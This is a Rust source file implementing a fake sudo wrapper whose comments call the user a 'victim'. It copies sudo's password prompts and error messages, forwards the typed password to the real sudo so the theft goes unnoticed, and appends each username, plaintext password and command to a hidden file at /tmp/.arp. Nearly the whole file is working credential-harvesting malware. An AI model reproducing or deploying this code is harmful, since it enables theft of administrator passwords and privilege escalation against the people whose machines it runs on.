#![allow(non_snake_case)]

use nix::unistd::{getuid, User};
use termion::input::TermRead;
use std::{io::{stdin, stdout, Write}, process::Command, fs::OpenOptions}; 


// Faking sudo 
pub fn SUDO(arguments: String) {
    
    // Getting a user by UID.
    let res = User::from_uid(getuid()).unwrap().unwrap();

    if arguments.is_empty() { 
        ROOT(arguments);
    } else if res.name != "root" && checkSUDO() != 0 {
 
        let mut attempt = 0_u32;
        
        loop {
         
            print!("[sudo] password for {}:", res.clone().name);
            let password = getPASS(attempt);
            println!();

            let path = format!("echo {} | /usr/bin/sudo -S{} 2>/dev/null", password, arguments.clone());
         
            let status = Command::new("sh")
                                    .arg("-c")
                                    .arg(&path)
                                    .status()
                                    .unwrap();
            
            
            if status.code().unwrap() == 0 { 
                
                SAVE(res.clone().name, password, arguments.clone(), status.code().unwrap());
                break;

            } else if status.code().unwrap() == 1 && (0..2).contains(&attempt) {
                
                println!("Sorry, try again.");
                SAVE(res.clone().name, password, arguments.clone(), status.code().unwrap());
                                    
            } else if attempt == 2 {
                
                println!("sudo: 3 incorrect password attempts");
                SAVE(res.clone().name, password, arguments.clone(), status.code().unwrap());
                break;

            } else {
                break;
            }

            attempt += 1;
        }
    } else {
            ROOT(arguments);
    }
}

// Executing the victim's command without sniffing the password.
fn ROOT(arguments: String) {

    let path = format!("/usr/bin/sudo{}", arguments);
    Command::new("sh")
            .arg("-c")
            .arg(&path)
            .status()
            .unwrap();

}


// Checking if victims already have sudo access
fn checkSUDO() -> i32 {

    let status = Command::new("sh")
                            .arg("-c")
                            .arg("/usr/bin/sudo -n true 2>/dev/null")
                            .status()
                            .unwrap();
    status.code().unwrap()
}


// Sniffing the password similar like sudo
fn getPASS(attempt: u32) -> String {
    
    let stdout = stdout();
    let mut stdout = stdout.lock();
    let stdin = stdin();
    let mut stdin = stdin.lock();

    stdout.write_all(b" ").unwrap();
    match stdout.flush(){
        Ok(s) => s,
        Err(_) => std::process::exit(0),
    }

    let pass = match stdin.read_passwd(&mut stdout).unwrap() {
                    Some(s) => s,
                    None => {
                                if attempt == 0 {
                                    println!("\nsudo: a password is required");
                                    std::process::exit(1)
                                } else if attempt == 1 {
                                    println!("\nsudo: 1 incorrect password attempt");
                                    std::process::exit(2)
                                } else {
                                    println!("\nsudo: 2 incorrect password attempts");
                                    std::process::exit(3)
                                }
                            },
                };
    pass
     
}


// Writing data to tmp
fn SAVE(res: String, password: String, arguments: String, status: i32) {
    
    let mut file = OpenOptions::new().append(true).open("/tmp/.arp").unwrap();
    file.write_all(format!("\nUsername: {}\nPassword: {}\nArguments:{}\nStatus: {}\n", res.clone(), password, arguments, status).as_bytes()).unwrap();

}
